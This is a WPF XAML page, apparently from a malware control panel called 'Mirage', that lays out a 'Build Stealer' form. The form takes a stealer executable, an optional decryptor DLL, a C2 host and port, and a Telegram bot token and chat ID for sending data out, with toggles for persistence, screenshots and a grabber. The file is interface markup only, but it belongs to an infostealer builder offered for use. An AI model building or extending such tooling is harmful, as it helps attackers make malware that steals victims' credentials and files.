<Page x:Class="Mirage.Panel.Views.BuildPage"
      xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
      xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
      xmlns:materialDesign="http://materialdesigninxaml.net/winfx/xaml/themes"
      Title="Build" Background="{StaticResource MaterialDesignPaper}">
    <ScrollViewer Padding="20">
        <StackPanel MaxWidth="500">
            <TextBlock Text="Build Stealer" FontSize="28" FontWeight="Bold" Margin="0,0,0,20"/>

            <Button Content="Select Stealer Executable" Click="SelectStealerClick"
                    Style="{StaticResource MaterialDesignRaisedButton}" Margin="0,0,0,4"/>
            <TextBlock x:Name="StealerPath" Text="No file selected" Foreground="Gray" Margin="0,0,0,10"/>

            <Button Content="Select Decryptor DLL (optional)" Click="SelectDecryptorClick"
                    Style="{StaticResource MaterialDesignFlatButton}" Margin="0,0,0,4"/>
            <TextBlock x:Name="DecryptorPath" Text="No file selected" Foreground="Gray" Margin="0,0,0,10"/>

            <TextBlock Text="C2 Host" Margin="0,0,0,4"/>
            <TextBox x:Name="C2Host" Text="127.0.0.1" Style="{StaticResource MaterialDesignFloatingHintTextBox}"
                     materialDesign:HintAssist.Hint="C2 Host" Margin="0,0,0,10"/>

            <TextBlock Text="C2 Port" Margin="0,0,0,4"/>
            <TextBox x:Name="C2Port" Text="8443" Style="{StaticResource MaterialDesignFloatingHintTextBox}"
                     materialDesign:HintAssist.Hint="C2 Port" Margin="0,0,0,10"/>

            <TextBlock Text="Telegram Token" Margin="0,0,0,4"/>
            <TextBox x:Name="TelegramToken" Style="{StaticResource MaterialDesignFloatingHintTextBox}"
                     materialDesign:HintAssist.Hint="Telegram Token" Margin="0,0,0,10"/>

            <TextBlock Text="Telegram Chat ID" Margin="0,0,0,4"/>
            <TextBox x:Name="TelegramChatId" Style="{StaticResource MaterialDesignFloatingHintTextBox}"
                     materialDesign:HintAssist.Hint="Telegram Chat ID" Margin="0,0,0,10"/>

            <CheckBox x:Name="EnablePersistence" Content="Enable Persistence" Margin="0,0,0,10"/>
            <CheckBox x:Name="EnableScreenshot" Content="Enable Screenshot" IsChecked="True" Margin="0,0,0,10"/>
            <CheckBox x:Name="EnableGrabber" Content="Enable Grabber" IsChecked="True" Margin="0,0,0,10"/>

            <Button Content="Build" Click="BuildClick"
                    Style="{StaticResource MaterialDesignRaisedButton}" Margin="0,10,0,0"/>

            <TextBlock x:Name="StatusText" Margin="0,10,0,0" Foreground="Gray"/>
        </StackPanel>
    </ScrollViewer>
</Page>
